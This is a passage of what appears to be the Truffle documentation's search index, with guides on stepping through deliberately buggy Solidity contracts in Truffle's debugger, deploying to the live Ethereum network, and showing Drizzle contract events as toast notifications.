: pragma solidity ^ 0.4.17 ; 2 : 3 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > This is an interactive console. You can use the commands listed to interact with the code in different ways. The most common way to interact with the code is to \"step next\", which steps through the code one instruction at a time. Do this by pressing Enter or n : The output is as follows: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 4 : uint myVariable ; 5 : 6 : function set ( uint x ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Notice that the program has moved to the next instruction, located on line 6. (The carets point to the exact part of the instruction taking place.) Press Enter again to step to the next instruction: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^^^^^^^^^ Keep pressing Enter: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 6 : function set ( uint x ) public { 7 : while ( true ) { 8 : myVariable = x ; ^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 6 : function set ( uint x ) public { 7 : while ( true ) { 8 : myVariable = x ; ^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 6 : function set ( uint x ) public { 7 : while ( true ) { 8 : myVariable = x ; ^^^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^^^^^^^^^ Notice that the steps eventually repeat. In fact, pressing Enter over and over will repeat those transactions forever (or at least until the transaction runs out of gas). This tells you where the problem is. Type q to exit the debugger. Issue #2: An invalid error check \u00b6 Smart contracts can use statements like assert() to ensure that certain conditions are met. These can conflict with the state of the contract in ways that are irreconcilable. Here we will introduce such a condition, and then see how the debugger can find it. Introducing the error \u00b6 Open Store.sol again. Replace the set() function with the following: function set ( uint x ) public { assert ( x == 0 ); myVariable = x ; } This is the same as the original version, but with an assert() function added, testing to make sure that x == 0 . This will be fine until we set that value to something else, and then we'll have a problem. Testing the contract \u00b6 Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, reset the contract on the blockchain to its initially deployed state: migrate --reset Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); You will see an error: Error: VM Exception while processing transaction: invalid opcode This means that we have a problem on our hands. In the log window, note the transaction ID with that error. Debugging the issue \u00b6 Copy the transaction ID and use it as an argument to the debug command: debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f Note : Again, your transaction ID will be different from what is listed here. Now we are back in the debugger: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 1 : pragma solidity ^ 0.4.17 ; 2 : 3 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Press Enter a few times to step through the code. Eventually, the debugger will halt with an error message: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : assert ( x == 0 ); ^^^^^^^^^^^^^^ debug ( develop : 0x7e060037 ...) > Transaction halted with a RUNTIME ERROR . This is likely due to an intentional halting expression , like assert (), require () or revert (). It can also be due to out - of - gas exceptions . Please inspect your transaction parameters and contract code to determine the meaning of this error . It is this last event that is triggering the error. You can see that it is the assert() that is to blame. Issue #3: A function isn't operating as desired \u00b6 Sometimes, an error isn't a true error, in that it doesn't cause a problem at runtime, but instead is just doing something that you don't intend it to do. Take for example an event that would run if our variable was odd and another event that would run if our variable was even. If we accidentally swapped this conditional so that the opposite function would run, it wouldn't cause an error; nevertheless, the contract would act unexpectedly. Once again, we can use the debugger to see where things go wrong. Introducing the error \u00b6 Open Store.sol again. Replace the set() function with the following: event Odd (); event Even (); function set ( uint x ) public { myVariable = x ; if ( x % 2 == 0 ) { Odd (); } else { Even (); } } This code introduces two dummy events, Odd() and Even() that are triggered based on a conditional that checks whether x is divisible by 2 . But notice that we have the results flipped. If x is divisible by 2 , the Odd() event will run. Testing the contract \u00b6 Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, update the contract: migrate --reset You will see both the compiler output and the migration output. Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); Note that there is no error here. The response is given as a transaction ID with details: { tx : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , receipt : { transactionHash : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , transactionIndex : 0 , blockHash : '0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f' , blockNumber : 5 , gasUsed : 42404 , cumulativeGasUsed : 42404 , contractAddress : null , logs : [ [ Object ] ] }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , blockHash : '0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f' , blockNumber : 5 , address : '0x377bbcae5327695b32a1784e0e13bedc8e078c9c' , type : 'mined' , event : 'Odd' , args : {} } ] } But notice the logs of the transaction show the event Odd . That's wrong, and so our job is to find out why that's being invoked. Debugging the contract \u00b6 Copy that transaction ID and use it as an argument with the debug command: debug 0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42 Note : Again, your transaction ID will be different from what is listed here. You will enter the debugger as before. Press Enter multiple times to cycle through the steps. Eventually you will see that the conditional leads to the Odd() event: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 10 : function set ( uint x ) public { 11 : myVariable = x ; 12 : if ( x % 2 == 0 ) { ^^^^^^^^^^^^^^^^ debug ( develop : 0x7f799ad5 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 11 : myVariable = x ; 12 : if ( x % 2 == 0 ) { 13 : Odd (); ^^^^^ debug ( develop : 0x7f799ad5 ...) > The problem is revealed. The conditional is leading to the wrong event. Conclusion \u00b6 With the ability to debug your contracts directly within Truffle, you have even more power at your hands to make your smart contracts rock-solid and ready to deploy. Make sure to read more about Truffle Develop console and the debugger in the docs. If you have any questions, please join our community Gitter channel where hundreds of fellow Trufflers congregate to answer your questions! Happy debugging!","title":"Debugging a smart contract"},{"location":"guides/debugging-a-smart-contract/index.html#a-basic-smart-contract","text":"One of the most basic, non-trivial, types of smart contract is a simple storage contract . (This example was adapted from the Solidity documentation .) pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This contract does two things: Allows you to set a variable ( myVariable ) to a particular integer value Allows you to query that variable to get the selected value This isn't a very interesting contract, but that's not the point here. We want to see what happens when things go wrong. First, let's set up our environment.","title":"A basic smart contract"},{"location":"guides/debugging-a-smart-contract/index.html#deploying-the-basic-smart-contract","text":"Create a new directory where we will house our contract locally: mkdir simple-storage cd simple-storage Create a bare Truffle project: truffle init This will create directories such as contracts/ and migrations/ , and populate them with files we will use when we deploy our contract to the blockchain. Inside the contracts/ directory, create a file called Store.sol with the following content: pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This is the contract that we will be debugging. While the full details of this file are beyond the scope of this tutorial, note that there is a contract named SimpleStorage that contains a numeric variable myVariable and two functions: set() and get() . The first function stores a value in that variable and the second queries that value. Inside the migrations/ directory, create a file called 2_deploy_contracts.js and populate it with the following content: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { deployer . deploy ( SimpleStorage ); }; This file is the directive that allows us to deploy the SimpleStorage contract to the blockchain. On the terminal, compile the smart contract: truffle compile Open a second terminal and run truffle develop to start a development blockchain built directly into Truffle that we can use to test our contract: truffle develop The console will display a prompt truffle(develop)> . From here, unless otherwise specified, all commands will be typed on this prompt. With the develop console up and running, we can now deploy our contracts to the blockchain by running our migrations: migrate The response should look something like below, though the specific IDs will differ: Running migration: 1_initial_migration.js Replacing Migrations... ... 0xe4f911d95904c808a81f28de1e70a377968608348b627a66efa60077a900fb4c Migrations: 0x3ed10fd31b3fbb2c262e6ab074dd3c684b8aa06b Saving successful migration to network... ... 0x429a40ee574664a48753a33ea0c103fc78c5ca7750961d567d518ff7a31eefda Saving artifacts... Running migration: 2_deploy_contracts.js Replacing SimpleStorage... ... 0x6783341ba67d5c0415daa647513771f14cb8a3103cc5c15dab61e86a7ab0cfd2 SimpleStorage: 0x377bbcae5327695b32a1784e0e13bedc8e078c9c Saving successful migration to network... ... 0x6e25158c01a403d33079db641cb4d46b6245fd2e9196093d9e5984e45d64a866 Saving artifacts...","title":"Deploying the basic smart contract"},{"location":"guides/debugging-a-smart-contract/index.html#interacting-with-the-basic-smart-contract","text":"The smart contract is now deployed to a test network via truffle develop , which launches a console against Ganache , a local development blockchain built right into Truffle. We next want to interact with the smart contract to see how it works when working correctly. We'll interact using the truffle develop console. Note : If you're wondering why we didn't need to mine to get the transaction to be secured, the Truffle Develop console already takes care of that for us. If using a different network, you'll need to make sure you mine to get the transaction on the blockchain. In the console where truffle develop is running, run the following command: SimpleStorage . deployed (). then ( function ( instance ){ return instance . get . call ();}). then ( function ( value ){ return value . toNumber ()}); This command looks at the SimpleStorage contract, and then calls the get() function as defined inside it. It then returns the output, which is usually rendered as a string, and converts it to a number: 0 This shows us that our variable, myVariable , is set to 0 , even though we haven't set this variable to any value (yet). This is because variables with integer types are automatically populated with the value of zero in Solidity , unlike other languages where it might be NULL or undefined . Now let's run a transaction on our contract. We'll do this by running the set() function, where we can set our variable value to some other integer. Run the following command: SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); This sets the variable to 4 . The output shows some information about the transaction, including the transaction ID (hash), transaction receipt, and any event logs that were triggered during the course of the transaction: { tx : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , receipt : { transactionHash : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , transactionIndex : 0 , blockHash : '0x60adbf0523622dc1be52c627f37644ce0a343c8e7c8955b34c5a592da7d7c651' , blockNumber : 5 , gasUsed : 41577 , cumulativeGasUsed : 41577 , contractAddress : null , logs : [] }, logs : [] } Most important to us is the transaction ID (listed here both as tx and as transactionHash ). We'll need to copy that value when we start to debug. Note : Your transaction IDs will likely be different from what is listed here. To verify that the variable has changed values, run the get() function again: SimpleStorage . deployed (). then ( function ( instance ){ return instance . get . call ();}). then ( function ( value ){ return value . toNumber ()}); The output should look like this: 4","title":"Interacting with the basic smart contract"},{"location":"guides/debugging-a-smart-contract/index.html#debugging-errors","text":"The above shows how the contract should work. Now, we will introduce some small errors to the contract and redeploy it. We will see how the issues present itself, and also use Truffle's built-in debug feature to fix the issues . We will look at the following issues: An infinite loop Invalid error check No error, but a function isn't operating as desired","title":"Debugging errors"},{"location":"guides/debugging-a-smart-contract/index.html#issue-1-an-infinite-loop","text":"On the Ethereum blockchain, transactions cannot be set to run forever. A transaction can run up until its gas limit is reached. Once that happens, the transaction will error out, and an \"out of gas\" error will be returned. Since gas is priced in ether, this could have real-world financial implications. So fixing an out-of-gas error is critical.","title":"Issue #1: An infinite loop"},{"location":"guides/debugging-a-smart-contract/index.html#introducing-the-error","text":"An infinite loop is easy to create. Open Store.sol from the contracts/ directory in a text editor. Replace the set() function with the following: function set ( uint x ) public { while ( true ) { myVariable = x ; } } This function will never terminate, because of the while(true) conditional.","title":"Introducing the error"},{"location":"guides/debugging-a-smart-contract/index.html#testing-the-contract","text":"The Truffle Develop console has the ability to migrate updated contracts without the need to exit and restart the console. And since the migrate command can compile and migrate in one step, we can reset our contract on the blockchain in one step. In the Truffle Develop console, update the contract: migrate --reset You will see both the compiler output and the migration output. In order to facilitate error hunting, we will open a second console with logging. This will allow us to, for example, see transaction IDs when a transaction fails. In another terminal window, run the following command: truffle develop --log Leave that window for now and return to the first console. Now we are ready to run that transaction. Run the set() command from above. SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); An error will display: Error: VM Exception while processing transaction: out of gas Moreover, in the console with the logs, you will see more information: develop:testrpc eth_sendTransaction +0ms develop:testrpc +1s develop:testrpc Transaction: 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f +2ms develop:testrpc Gas usage: 4712388 +11ms develop:testrpc Block Number: 6 +15ms develop:testrpc Runtime Error: out of gas +0ms develop:testrpc +16ms With our failure and our transaction ID, we can now debug the transaction.","title":"Testing the contract"},{"location":"guides/debugging-a-smart-contract/index.html#debugging-the-issue","text":"Truffle contains a built-in debugger. The command to launch this is debug <Transaction ID> from the Truffle Develop console, or truffle debug <Transaction ID> from the terminal. Let's launch this now. In the Truffle Develop console, copy the transaction ID from the logs console and paste it as the argument in the debug command: debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f Note : Again, your transaction ID will be different from what is listed here. You will see the following output: Gathering transaction data ... Addresses affected : 0x377bbcae5327695b32a1784e0e13bedc8e078c9c - SimpleStorage Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next (;) step instruction , ( p ) print instruction , ( h ) print this help , ( q ) quit Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 1 : pragma solidity ^ 0.4.17 ; 2 : 3 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > This is an interactive console. You can use the commands listed to interact with the code in different ways. The most common way to interact with the code is to \"step next\", which steps through the code one instruction at a time. Do this by pressing Enter or n : The output is as follows: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 4 : uint myVariable ; 5 : 6 : function set ( uint x ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Notice that the program has moved to the next instruction, located on line 6. (The carets point to the exact part of the instruction taking place.) Press Enter again to step to the next instruction: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^^^^^^^^^ Keep pressing Enter: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 6 : function set ( uint x ) public { 7 : while ( true ) { 8 : myVariable = x ; ^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 6 : function set ( uint x ) public { 7 : while ( true ) { 8 : myVariable = x ; ^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 6 : function set ( uint x ) public { 7 : while ( true ) { 8 : myVariable = x ; ^^^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : while ( true ) { ^^^^^^^^^^^^ Notice that the steps eventually repeat. In fact, pressing Enter over and over will repeat those transactions forever (or at least until the transaction runs out of gas). This tells you where the problem is. Type q to exit the debugger.","title":"Debugging the issue"},{"location":"guides/debugging-a-smart-contract/index.html#issue-2-an-invalid-error-check","text":"Smart contracts can use statements like assert() to ensure that certain conditions are met. These can conflict with the state of the contract in ways that are irreconcilable. Here we will introduce such a condition, and then see how the debugger can find it.","title":"Issue #2: An invalid error check"},{"location":"guides/debugging-a-smart-contract/index.html#introducing-the-error_1","text":"Open Store.sol again. Replace the set() function with the following: function set ( uint x ) public { assert ( x == 0 ); myVariable = x ; } This is the same as the original version, but with an assert() function added, testing to make sure that x == 0 . This will be fine until we set that value to something else, and then we'll have a problem.","title":"Introducing the error"},{"location":"guides/debugging-a-smart-contract/index.html#testing-the-contract_1","text":"Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, reset the contract on the blockchain to its initially deployed state: migrate --reset Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); You will see an error: Error: VM Exception while processing transaction: invalid opcode This means that we have a problem on our hands. In the log window, note the transaction ID with that error.","title":"Testing the contract"},{"location":"guides/debugging-a-smart-contract/index.html#debugging-the-issue_1","text":"Copy the transaction ID and use it as an argument to the debug command: debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f Note : Again, your transaction ID will be different from what is listed here. Now we are back in the debugger: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 1 : pragma solidity ^ 0.4.17 ; 2 : 3 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^ debug ( develop : 0xe4933407 ...) > Press Enter a few times to step through the code. Eventually, the debugger will halt with an error message: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 5 : 6 : function set ( uint x ) public { 7 : assert ( x == 0 ); ^^^^^^^^^^^^^^ debug ( develop : 0x7e060037 ...) > Transaction halted with a RUNTIME ERROR . This is likely due to an intentional halting expression , like assert (), require () or revert (). It can also be due to out - of - gas exceptions . Please inspect your transaction parameters and contract code to determine the meaning of this error . It is this last event that is triggering the error. You can see that it is the assert() that is to blame.","title":"Debugging the issue"},{"location":"guides/debugging-a-smart-contract/index.html#issue-3-a-function-isnt-operating-as-desired","text":"Sometimes, an error isn't a true error, in that it doesn't cause a problem at runtime, but instead is just doing something that you don't intend it to do. Take for example an event that would run if our variable was odd and another event that would run if our variable was even. If we accidentally swapped this conditional so that the opposite function would run, it wouldn't cause an error; nevertheless, the contract would act unexpectedly. Once again, we can use the debugger to see where things go wrong.","title":"Issue #3: A function isn't operating as desired"},{"location":"guides/debugging-a-smart-contract/index.html#introducing-the-error_2","text":"Open Store.sol again. Replace the set() function with the following: event Odd (); event Even (); function set ( uint x ) public { myVariable = x ; if ( x % 2 == 0 ) { Odd (); } else { Even (); } } This code introduces two dummy events, Odd() and Even() that are triggered based on a conditional that checks whether x is divisible by 2 . But notice that we have the results flipped. If x is divisible by 2 , the Odd() event will run.","title":"Introducing the error"},{"location":"guides/debugging-a-smart-contract/index.html#testing-the-contract_2","text":"Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, update the contract: migrate --reset You will see both the compiler output and the migration output. Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); Note that there is no error here. The response is given as a transaction ID with details: { tx : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , receipt : { transactionHash : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , transactionIndex : 0 , blockHash : '0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f' , blockNumber : 5 , gasUsed : 42404 , cumulativeGasUsed : 42404 , contractAddress : null , logs : [ [ Object ] ] }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , blockHash : '0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f' , blockNumber : 5 , address : '0x377bbcae5327695b32a1784e0e13bedc8e078c9c' , type : 'mined' , event : 'Odd' , args : {} } ] } But notice the logs of the transaction show the event Odd . That's wrong, and so our job is to find out why that's being invoked.","title":"Testing the contract"},{"location":"guides/debugging-a-smart-contract/index.html#debugging-the-contract","text":"Copy that transaction ID and use it as an argument with the debug command: debug 0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42 Note : Again, your transaction ID will be different from what is listed here. You will enter the debugger as before. Press Enter multiple times to cycle through the steps. Eventually you will see that the conditional leads to the Odd() event: Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 10 : function set ( uint x ) public { 11 : myVariable = x ; 12 : if ( x % 2 == 0 ) { ^^^^^^^^^^^^^^^^ debug ( develop : 0x7f799ad5 ...) > Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 11 : myVariable = x ; 12 : if ( x % 2 == 0 ) { 13 : Odd (); ^^^^^ debug ( develop : 0x7f799ad5 ...) > The problem is revealed. The conditional is leading to the wrong event.","title":"Debugging the contract"},{"location":"guides/debugging-a-smart-contract/index.html#conclusion","text":"With the ability to debug your contracts directly within Truffle, you have even more power at your hands to make your smart contracts rock-solid and ready to deploy. Make sure to read more about Truffle Develop console and the debugger in the docs. If you have any questions, please join our community Gitter channel where hundreds of fellow Trufflers congregate to answer your questions! Happy debugging!","title":"Conclusion"},{"location":"guides/deploying-to-the-live-network/index.html","text":"When you're finished developing your contracts and would like others to use them, the next step is to deploy them to the live network. By now you will have been working on a development network like Ganache , and you will have noticed Truffle is set up to support that by default. Deploying to the live network -- or any other network -- will require that you first connect one of the many Ethereum clients to your network of choice, as well as configure Truffle correctly. Setting Up Your Ethereum client \u00b6 There are many Ethereum clients to choose from. The most popular are go-ethereum and cpp-ethereum . This tutorial cannot go into the details of setting up each client for each operating system, but be sure your desired client is installed and configured to perform the following: Your client is completely synced with the live network Your client is hosting an RPC server on 127.0.0.1 and port 8546 (for this tutorial) Your client has at least one account registered and can sign transactions for that account The registered account contains enough Ether to deploy your contracts If you don't want to set up an Ethereum client yourself, you can alternatively use Infura . This will require you configure Truffle correctly for Infura before proceeding. Configuring Truffle \u00b6 The default Truffle configuration without any bells and whistles looks like this: module . exports = { rpc : { host : \"127.0.0.1\" , port : 8545 } }; This tells Truffle that by default it should connect to an Ethereum client at host 127.0.0.1 and port 8545 . You could keep this configuration and simply stop your development client and run the live network at the same host and port; however, Truffle won't know how to distinguish deployment artifacts on the development network from those same artifacts on the live network (like deployed addresses, for instance). To ensure Truffle knows the network you want to deploy to, we can add a specific configuration for the live network: module . exports = { networks : { \"live\" : { network_id : 1 , host : \"127.0.0.1\" , port : 8546 // Different than the default below } }, rpc : { host : \"127.0.0.1\" , port : 8545 } }; Notice we set up our live Ethereum client to run on a different port to ensure we don't inadvertently deploy to the wrong network. One important configuration option to pay attention to is network_id . Here, we set the network id to 1 to signify that the network named \"live\" within the configuration represents only the network identified by an id of 1 . Since only the live Ethereum network has that id (all other networks do not), we can be sure this configuration will only apply to the live Ethereum network. Private networks will have their own network id, for example, and the Morden testnet -- a publically shared network used only for testing -- has a network id of 2 . Deploying to the Live Network \u00b6 Now that our configuration is set up, we can now deploy to the live network. When deploying, we must specifically ask for the live network or else Truffle will fall back to the default configuration. To do so, we can deploy with the following command: $ truffle migrate --network live Notice that we asked for the \"live\" network, which is the name we defined in the configuration, and Truffle will connect to the specified host and port -- in this case http://127.0.0.1:8546 -- to deploy our contracts. Your migrations are run on this network just as they'd run on any other network. If you had previously deployed to the live network before, truffle migrate --network live will check which migration was last run and only start deploying from there. And That's it! \u00b6 Congrats! You have now deployed your contracts to the live network. For more details on network configuration and deployment, be sure to check out the Truffle documentation .","title":"Deploying to the Live Network"},{"location":"guides/deploying-to-the-live-network/index.html#setting-up-your-ethereum-client","text":"There are many Ethereum clients to choose from. The most popular are go-ethereum and cpp-ethereum . This tutorial cannot go into the details of setting up each client for each operating system, but be sure your desired client is installed and configured to perform the following: Your client is completely synced with the live network Your client is hosting an RPC server on 127.0.0.1 and port 8546 (for this tutorial) Your client has at least one account registered and can sign transactions for that account The registered account contains enough Ether to deploy your contracts If you don't want to set up an Ethereum client yourself, you can alternatively use Infura . This will require you configure Truffle correctly for Infura before proceeding.","title":"Setting Up Your Ethereum client"},{"location":"guides/deploying-to-the-live-network/index.html#configuring-truffle","text":"The default Truffle configuration without any bells and whistles looks like this: module . exports = { rpc : { host : \"127.0.0.1\" , port : 8545 } }; This tells Truffle that by default it should connect to an Ethereum client at host 127.0.0.1 and port 8545 . You could keep this configuration and simply stop your development client and run the live network at the same host and port; however, Truffle won't know how to distinguish deployment artifacts on the development network from those same artifacts on the live network (like deployed addresses, for instance). To ensure Truffle knows the network you want to deploy to, we can add a specific configuration for the live network: module . exports = { networks : { \"live\" : { network_id : 1 , host : \"127.0.0.1\" , port : 8546 // Different than the default below } }, rpc : { host : \"127.0.0.1\" , port : 8545 } }; Notice we set up our live Ethereum client to run on a different port to ensure we don't inadvertently deploy to the wrong network. One important configuration option to pay attention to is network_id . Here, we set the network id to 1 to signify that the network named \"live\" within the configuration represents only the network identified by an id of 1 . Since only the live Ethereum network has that id (all other networks do not), we can be sure this configuration will only apply to the live Ethereum network. Private networks will have their own network id, for example, and the Morden testnet -- a publically shared network used only for testing -- has a network id of 2 .","title":"Configuring Truffle"},{"location":"guides/deploying-to-the-live-network/index.html#deploying-to-the-live-network","text":"Now that our configuration is set up, we can now deploy to the live network. When deploying, we must specifically ask for the live network or else Truffle will fall back to the default configuration. To do so, we can deploy with the following command: $ truffle migrate --network live Notice that we asked for the \"live\" network, which is the name we defined in the configuration, and Truffle will connect to the specified host and port -- in this case http://127.0.0.1:8546 -- to deploy our contracts. Your migrations are run on this network just as they'd run on any other network. If you had previously deployed to the live network before, truffle migrate --network live will check which migration was last run and only start deploying from there.","title":"Deploying to the Live Network"},{"location":"guides/deploying-to-the-live-network/index.html#and-thats-it","text":"Congrats! You have now deployed your contracts to the live network. For more details on network configuration and deployment, be sure to check out the Truffle documentation .","title":"And That's it!"},{"location":"guides/drizzle-and-contract-events/index.html","text":"Drizzle and Contract Events \u00b6 Drizzle is ideal for synchronizing contract state with a user interface, but as dapps grow in complexity we foresee growing demand for coordination with off-chain services. The code in this section may be small, but it opens up a powerful mechanism to enable that coordination. Imagine your dapp needs to send a message whenever a contract event is generated. Lets see how to make this happen. This tutorial demonstrates how to use Drizzle to subscribe to smart contract events. The finished dapp. We'll use react-toastify to alert the user whenever a SimpleStorage contract event is emitted. We have to declare a component and invoke toast.success() when an event is detected. We'll touch MyComponent and the event reducer respectively. A Complete example is available at the following repo . Prerequisite : You should be familiar with Truffle, Drizzle, React and Redux. If you need an introduction please consult the following resources: Truffle Quickstart Getting Started with Drizzle and React Tutorial: Intro to React Redux Basic Tutorial Redux Saga Redux Middleware Unbox Drizzle \u00b6 Let's use truffle unbox to bootstrap a project and then wire up a contract event to a display component by creating a reducer and hook it up to Drizzle's EVENT_FIRED action. Note : More Drizzle actions are listed in our Drizzle Actions documentation . First create an empty directory, navigate to it, and unbox Drizzle. // In the project directory... $ truffle unbox drizzle Now let's start the truffle develop console (which runs a Ganache test blockchain in the background): $ truffle develop Finally, in our Truffle develop console, let's compile and migrate our smart contracts. truffle ( develop ) > compile # some output here... truffle ( develop ) > migrate Now that we have a test chain running and our smart contracts deployed, let's add a toast notification to the UI. Listen for Contract Events \u00b6 We want to listen for the SimpleStorage contract's StorageSet event and show a toast notification once it fires. The front end code is located under the app folder. Lets add the notification library react-toastify to simulate an external interaction. $ cd app $ npm install react-toastify For the sake of simplicity, we will work in one file, ./app/src/middleware/index.js . $ mkdir ./src/middleware $ touch ./src/middleware/index.js Import EventActions and generateStore from Drizzle as well as toast from react-toastify , and drizzleOptions . // ./app/middleware/index.js import { generateStore , EventActions } from '@drizzle/store' import drizzleOptions from '../drizzleOptions' import { toast } from 'react-toastify' The action EventActions.EVENT_FIRED is emitted whenever a contract event is detected in a Block. We will gain access to it by registering a custom middleware with the Redux store. As you know, Redux middleware comprises a set of functions executed in a sequence that processes each dispatched actions before passing them to Reducers. const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const message = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ message } ` toast . success ( display , { position : toast . POSITION . TOP_RIGHT }) } return next ( action ) } Now lets register this middleware with Drizzle. generateStore will return a Redux store that you can use anywhere you can use a store. We will export it to be used by DrizzleProvider . const appMiddlewares = [ contractEventNotifier ] export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! }) Connect the Store \u00b6 Send the store as a prop to DrizzleProvider // App.js ... import store from './middleware' ... const drizzle = new Drizzle ( drizzleOptions , store ); ... Hook up Display \u00b6 Modify MyComponent.js to import ReactToastify.css and configure ToastContainer ... import { ToastContainer } from 'react-toastify' import 'react-toastify/dist/ReactToastify.css' ... export default ({ accounts }) => ( < div className = \"App\" > < ToastContainer /> ... < /div> A Quick Test \u00b6 Things often go south during development so a pretest check is in order. MetaMask should NOT be on Main net! Do not run this if you're on main net! Is MetaMask listening on the correct port defined above? Metamask should have ETH funds. Something is amiss if it doesn't. Are the smart contracts deployed from the correct directory? Fire up the app. $ npm run start Change SimpleStorage's stored Value You'll be rewarded with a toast notification when the transaction is completed. The dapp is now a consumer of Drizzle's EVENT_FIRED action item and can coordinate with other services to implement its business logic. More Drizzle actions are listed in our Drizzle Actions documentation .","title":"Drizzle and Contract Events"},{"location":"guides/drizzle-and-contract-events/index.html#drizzle-and-contract-events","text":"Drizzle is ideal for 